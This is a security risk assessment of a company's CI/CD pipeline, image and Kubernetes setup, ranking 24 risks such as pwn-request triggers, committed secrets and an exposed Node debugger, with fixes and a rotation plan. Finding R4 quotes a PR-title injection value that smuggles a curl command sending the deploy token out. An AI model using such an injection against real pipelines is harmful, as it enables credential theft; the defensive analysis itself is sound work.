# StockDesk delivery chain: prioritised risks

Scope: everything between a commit and a running pod: repository, CI pipeline,
image, Kubernetes manifests, and the application code where it touches them.
Each risk ID (R1...) is referenced in the commit messages, so `git log` shows
which commit fixed it.

## Assumptions (from the brief and the answers to the finalists' questions)

| # | Assumption | Why |
|---|---|---|
| A1 | `DB_PASSWORD`, `API_KEY`, `DEPLOY_TOKEN` **are live production values and are compromised**. | Nobody can prove they were never used in production; the file says "production settings", the values say `prod` / `live`; 40 people including an external contractor can read them, and forks exist. Treating them as test values would be a bet; rotating them costs a few hours. |
| A2 | The `KUBECONFIG` GitHub secret **is cluster-admin and compromised**. | Nobody knows its rights; it was created by a contractor who has left (who may still hold a copy); it was reachable from any branch push and handed to a third-party action at `@main`. |
| A3 | The `LoadBalancer` Service **is reachable from the Internet**. | Unknown; this is the cloud default for `type: LoadBalancer`. It also exposes the Node inspector port 9229. |
| A4 | Any of the 40 readers can open a PR, including from a fork. | Confirmed by Corvane. |
| A5 | The GitHub plan may not offer environment reviewers / branch protection on a private repo. | Unknown; the pipeline is built so that it is safe even without them, and better with them. |
| A6 | Suppliers will **not** use the shared test cluster. | Recommendation below (R13); the CTO asked for one. |

## How the risks are ranked

Priority = **impact** (what an attacker gets) x **ease** (who can do it, today,
with what access) x **urgency** (is it already happening, and must it be fixed
before something else works). P0: exploitable today by an insider or outsider
with no special access, leading to credentials or code execution. P1: serious,
but needs a prior foothold or a specific condition. P2: robustness and defence
in depth. P3: low impact or improvement.

## Summary

| ID | P | Where | Risk | Status |
|---|---|---|---|---|
| R1 | P0 | ci.yml | `pull_request_target` runs PR code with secrets and a write-all token, then deploys it | **Fixed** |
| R2 | P0 | .env, compose, k8s/secret.yaml, ci.yml | Production secrets committed in the repository and its history | **Reduced** (removed from files) - **rotation needed (admins)** |
| R3 | P0 | Dockerfile, deployment.yaml | Node inspector on 0.0.0.0:9229, published by the LoadBalancer = remote code execution | **Fixed** (old Service must be deleted by an admin) |
| R4 | P0 | ci.yml | Shell injection through the PR title | **Fixed** |
| R5 | P0 | ci.yml | `DEPLOY_TOKEN` hardcoded and echoed in the build logs | **Fixed** in code - **old logs and token: admins** |
| R6 | P1 | ci.yml | Third-party action at `@main` receives a KUBECONFIG of unknown scope | **Fixed** (kubectl) / **Reduced** (scoped RBAC ready, admin to apply) |
| R7 | P1 | ci.yml | Any branch push deploys, no gate | **Fixed** (main + environment) |
| R8 | P1 | Dockerfile | `COPY . .` without `.dockerignore` bakes `.env` and `.git` into the image | **Fixed** (old images: admins) |
| R9 | P1 | src/server.js | Startup log prints the DB password and the API key | **Fixed** |
| R10 | P1 | k8s/secret.yaml + deploy | Each deploy overwrites the cluster Secret with the leaked value | **Fixed** |
| R11 | P1 | Dockerfile | `node:latest`, full image, runs as root | **Fixed** (digest pin: TODO verify) |
| R12 | P1 | deployment.yaml | No securityContext, SA token mounted, `default` namespace | **Fixed** |
| R13 | P1 | deployment.yaml | Public plain-HTTP LoadBalancer; API key in clear | **Reduced** (ClusterIP); supplier exposure **Open** (recommendation) |
| R14 | P1 | ci.yml, deployment.yaml | Mutable `:latest` + `IfNotPresent`: no traceability, overwritable | **Fixed** (SHA tag, deploy by digest) |
| R15 | P2 | ci.yml | `npm test \|\| true`, `node: latest`, no security scanning | **Fixed** |
| R16 | P2 | deployment.yaml, server.js | Liveness depends on the database; 1 s timeout = 1 s DB check | **Fixed** |
| R17 | P2 | server.js | Node as PID 1 ignores SIGTERM: 30 s hang then SIGKILL | **Fixed** |
| R18 | P2 | deployment.yaml | No requests/limits on a shared cluster | **Fixed** |
| R19 | P2 | docker-compose.yml | Prod password, Postgres and inspector published on all interfaces | **Fixed** (dev-only) |
| R20 | P2 | server.js | `GET /api/products` unauthenticated; one API key shared by everyone | **Open** (design decision) |
| R21 | P3 | server.js | Non-constant-time key check; unbounded request body | **Fixed** |
| R22 | P3 | k8s | No NetworkPolicy; single replica; no PDB | **Reduced** (NetworkPolicy, DB rule loose); PDB **left on purpose** |
| R23 | P2 | process | Secret scanners miss Corvane's own token formats | **Fixed** (custom gitleaks rules) |
| R24 | P2 | process | Nothing stops someone with write access from changing the workflow on `main` | **Open** (plan-dependent: branch protection, CODEOWNERS) |

## Why this order (top five)

1. **R1 (+R4, R5) - the PR pipeline.** Highest impact x ease: any of the 40
   readers, including the external contractor, could open a PR whose `test`
   script runs with a write token and the registry token; the image built from
   that PR was then pushed as `:latest` and deployed next to the database
   credentials. No review, no special rights, a few lines of code. It is also
   first in the *fix order*: rotating secrets while this path is open would
   just leak the new ones.
2. **R2 - the committed secrets.** The exposure has already happened and no file
   edit undoes it (history, clones, forks). It ranks below R1 only because R1
   leads to *more* (registry, cluster, code in production) and must be closed
   before rotation. Its remediation is not in the code: see the plan below.
3. **R3 - remote debugger.** Unauthenticated code execution inside the pod, which
   holds the DB password and API key in its environment. Ranked below R1/R2
   only because Internet exposure is unverified (A3); anyone inside the
   cluster network could use it anyway.
4. **R6 + R7 + R14 - trust in the deploy chain.** Credentials of unknown scope
   given to code nobody at Corvane controls, deploys from any branch, mutable
   images. Severe, but needs either write access or an upstream compromise
   (which happens: tag hijacks hit `aquasecurity/trivy-action` in March 2026).
5. **R8 + R9 + R10 - secrets leaking at run time.** Image layers, logs, and a
   deploy that restores the leaked Secret. Lower exposure today than R2, but if
   not fixed *before* rotation, rotation silently fails.

## Details

Format: **Where** / **What could happen** / **Severity** / **What I did** / **Left, and who**.

**R1 - `pull_request_target` "pwn request" (P0)**
- Where: `ci.yml` triggers, `checkout` of `pull_request.head.sha`, `permissions: write-all`.
- What could happen: a fork PR changes `package.json` `"test"` to send `$DEPLOY_TOKEN` and the persisted `GITHUB_TOKEN` to an attacker, or adds a backdoor that is built, pushed as `:latest` and deployed by the `deploy` job (which also ran on PR events).
- Severity: P0, any reader, no review, leads to registry + repo write + code in the cluster.
- Done: `pull_request` (fork PRs get no secrets, read-only token); `permissions: {}` + `contents: read` per job; `persist-credentials: false`; publish/deploy only on push to `main`.
- Left: GitHub admin should also set "Require approval for fork PR workflows" for outside collaborators.

**R2 - secrets committed (P0)** - Done: `.env` and `k8s/secret.yaml` deleted, `.env.example`, `.gitignore`, compose reads `.env`, token removed from `ci.yml`. Left: **rotation and clean-up, see the plan below (admins).**

**R3 - Node inspector exposed (P0)**
- What could happen: `node --inspect=0.0.0.0:9229` + Service port 9229: anyone who reaches it attaches a debugger and runs arbitrary JavaScript (read `process.env`, connect to the DB, pivot in the cluster).
- Done: flag, `EXPOSE 9229` and both debug ports removed; local-only opt-in in `docker-compose.debug.yml` (127.0.0.1).
- Left (cluster admin, **immediately**): the old `stockdesk` Service in namespace `default` keeps running until deleted - `kubectl apply` does not prune it.

**R4 - PR title injection (P0)** - `${{ github.event.pull_request.title }}` was expanded into a `run:` script: a title such as `"; curl ... -d "$DEPLOY_TOKEN" #` ran in the job. Done: step removed (it had no purpose); actionlint now runs in CI and flags this pattern.

**R5 - token in the logs (P0)** - `echo "Logging in with token $DEPLOY_TOKEN"`: it was not a registered secret, so GitHub did not mask it; run logs are readable by all repo readers. Done: secret from the environment, `--password-stdin`, no echo. Left: delete old workflow runs/logs (repo admin), rotate the token.

**R6 - third-party deploy action (P1, P0 if `corvane-labs` is not Corvane's)** - Done: replaced by `kubectl` on the runner; all actions pinned to full commit SHAs resolved with `git ls-remote`; scanners downloaded as release assets pinned by SHA-256. Ready: `k8s/admin/ci-rbac.yaml`, a deployer limited to namespace `stockdesk` (no Secrets, no delete). Left: cluster admin applies it and replaces the KUBECONFIG (plan below); `kubectl` version on the runner is not pinned (TODO).

**R7 - deploy from any branch (P1)** - Done: release job only `if: push && ref == main`, `environment: test` holding the secrets (environment secrets restricted to `main` are not readable from other branches, unlike repository secrets), `concurrency`. Left: GitHub admin creates the environment, deployment branch policy `main`, and required reviewers if the plan allows (A5).

**R8 - secrets baked into the image (P1)** - Done: targeted `COPY`, allow-list `.dockerignore` (checked with Docker's own matcher library: only 4 files reach the context). Left: registry admin deletes or restricts old `stockdesk:latest` images (they contain `.env` and `.git`).

**R9 - secrets in logs (P1)** - Done: startup log redacted (`[set]` / `[empty]`), with a test that fails if the old line comes back (checked). Left: purge old pod logs from any log aggregator.

**R10 - deploy restores the leaked Secret (P1)** - The deploy applied the whole `k8s/` folder, including `secret.yaml`. Done: file removed; CI applies only `deployment.yaml` and `networkpolicy.yaml`; the Secret is created by an admin (README).

**R11 - base image and root (P1)** - Done: `node:22-alpine` (LTS, same major as `.nvmrc`), npm/yarn removed, UID 10001, code owned by root. Left: **TODO verify** - pin `@sha256:` digest (Docker Hub unreachable from my environment).

**R12 - pod hardening (P1)** - Done: namespace `stockdesk` with Pod Security `restricted` enforced; runAsNonRoot, no privilege escalation, drop ALL, seccomp RuntimeDefault, read-only root + `/tmp` emptyDir, ServiceAccount without token, `enableServiceLinks: false`. Left: admin applies the namespace and moves the Secret there.

**R13 - exposure to suppliers (P1)** - Done: `ClusterIP`. Recommendation (not built): do **not** open the shared test cluster to suppliers. Use a separate production namespace/cluster with an Ingress terminating **TLS** (cert-manager), per-supplier API keys (R20), rate limiting at the ingress, and a DB that is not the test one. Until then testers use `kubectl port-forward`. Left: Open - CTO decision.

**R14 - mutable images (P1)** - Done: image tagged with the commit SHA, the exact scanned image handed to the release job (`docker save` artifact), deployed by registry digest; the deploy step refuses anything else (tested with 5 inputs). Left: enable tag immutability on the registry (admin); image signing (cosign) not done.

**R15 - weak gates (P2)** - Done: tests must pass; `npm ci --ignore-scripts` with a lockfile; Node from `.nvmrc`; gitleaks, actionlint, hadolint, kubeconform, trivy (config + image, fails on fixable HIGH/CRITICAL), CycloneDX SBOM, Dependabot.

**R16 - probes (P2)** - A DB outage made liveness fail and restart the pod in a loop (which does not fix the DB); the 1 s probe timeout equalled the 1 s DB check, so a slow DB also failed it. Done: `/livez` (no DB) for liveness, `/health` (unchanged) for readiness with a 3 s timeout; test added.

**R17 - SIGTERM (P2)** - Done: handler closes the server; checked with a real process (exit 0 on SIGTERM).

**R18 - resources (P2)** - Done: requests 50m/64Mi, limits 500m/256Mi. Values are a starting point, not measured.

**R19 - compose (P2)** - Done: dev-only, password from `.env`, Postgres not published, app on 127.0.0.1, read-only, no capabilities; debugger opt-in on 127.0.0.1. Left: whoever runs compose on "test servers" must stop doing so (ops). `postgres:17-alpine` digest: TODO verify.

**R20 - API authorisation model (P2, Open)** - Anyone who reaches the API can read the whole stock; a single shared key cannot be traced or revoked per supplier. Not fixed: it is a product decision. Recommendation: per-supplier keys or OAuth client credentials at the ingress/gateway, authenticated reads.

**R21 - key check and body size (P3)** - Done: SHA-256 + `timingSafeEqual`; body capped at 1 KB (413); tests added.

**R22 - network and availability (P3)** - Done: NetworkPolicy (ingress from the ingress controller namespace only; egress DNS + TCP 5432). Limits: only effective if the CNI enforces it (TODO verify); the DB rule restricts the port, not the destination, because nobody knows where the DB runs. **No PDB on purpose**: with 1 replica, `minAvailable: 1` would block node drains, and more replicas would split the in-memory stock.

**R23 - scanners blind to Corvane's formats (P2)** - gitleaks' default rules missed `sdk_live_...` and `cvn_deploy_...`. Done: `.gitleaks.toml` with two rules; on the original commit, findings go from 6 to 9 (docs/evidence/before.md).

**R24 - insider with write access (P2, Open)** - Anyone with write access can still merge a workflow change to `main`. Left: branch protection with required review, CODEOWNERS on `.github/` and `k8s/`, environment reviewers (GitHub admin, plan-dependent).

## The secrets already exposed: what to do, in which order, by whom

I cannot change these credentials. Roles below may be the same person at Corvane.
"Repo" = can be done by a merge to this repository; everything else needs an
administrator.

| Step | When | What | Who |
|---|---|---|---|
| 1. Contain | Today, first hour | Delete the old `stockdesk` Service (LoadBalancer + port 9229) in namespace `default`. Disable the old workflow (Actions > disable) until this branch is merged. | Cluster admin; repo admin |
| 2. Close the leak paths | Before any rotation | Merge this branch: new pipeline (R1, R4, R5, R7), redacted logs (R9), no `secret.yaml` (R10), no `.env` in images (R8). Otherwise new secrets leak the same way, or the next deploy restores the old ones. | Repo (review + merge) |
| 3. Rotate KUBECONFIG | Same day | Apply `k8s/admin/namespace.yaml` and `ci-rbac.yaml`; create a kubeconfig for `ci-deployer`; store it as the `KUBECONFIG` secret of the `test` environment. **Revoke the old identity**: delete its ServiceAccount/token, or, if it is a client certificate (cannot be revoked one by one), remove every RoleBinding/ClusterRoleBinding of that user. | Cluster admin |
| 4. Rotate DEPLOY_TOKEN | Same day | Revoke `cvn_deploy_...`; create a push-only token for `stockdesk` only; store as `DEPLOY_TOKEN` in the `test` environment; turn on tag immutability. | Registry admin |
| 5. Rotate DB_PASSWORD | Same day | New random password in the password manager; `ALTER ROLE stockdesk PASSWORD ...` (or a new role, switch, then drop the old one, for zero downtime); recreate the Secret in namespace `stockdesk`; `kubectl rollout restart`; check `/health`. Check whether the same password is used anywhere else (the `.env` says it came from the ops wiki: remove it from the wiki). | DBA + cluster admin |
| 6. Rotate API_KEY | Same day, announced | Unknown consumers: first ask the teams who calls `POST /adjust`, and check LB/ingress logs. New key (e.g. `openssl rand -hex 32`), update the Secret, restart, give the key to known consumers through the password manager. The app accepts one key, so the switch is a short coordinated cut-over. | App owner + CTO (communication) |
| 7. Verify | After each rotation | The **old** value fails: `docker login` refused, `kubectl` forbidden, `psql` refused, `POST /adjust` with the old key gives 401. The **new** one works: a push to `main` builds, pushes and deploys; readiness green. | Each owner |
| 8. Investigate | This week | GitHub audit log and Actions history: any `pull_request_target` runs from forks, and what they ran; registry push history (images not built from `main`); cluster audit logs if enabled; Postgres connection logs (`log_connections`) for unknown sources; LB/firewall logs for traffic on 9229. If anything suspicious: incident process, wider rotation. | Repo, registry, cluster admins, DBA |
| 9. Clean up | After rotation, optional | Delete old workflow logs (R5) and old images (R8). History rewrite (`git filter-repo`, force push, everyone re-clones, GitHub support to purge cached PR refs) only *after* rotation: it does not reach existing clones and forks, so it is hygiene, not a fix. | Repo admin, with CTO approval |
| 10. Prevent | This month | gitleaks in CI (done, with Corvane's formats) + as a pre-commit hook; GitHub secret scanning / push protection if the plan includes it; secrets only in the password manager, GitHub environment secrets and the cluster; later Sealed Secrets (below). | Repo admin, all developers |

**Managing Kubernetes secrets without a vault (recommendation, not installed).**
Today: the admin creates `stockdesk-env` by hand (README), CI never reads or
writes Secrets (the deployer role has no access to them). Next step: Sealed
Secrets (free, open source): a controller in the cluster holds a private key;
developers commit only *encrypted* SealedSecret objects that only that cluster
can decrypt. That keeps secrets reviewable in git without exposing them to the
40 readers. Alternative: SOPS + age keys.
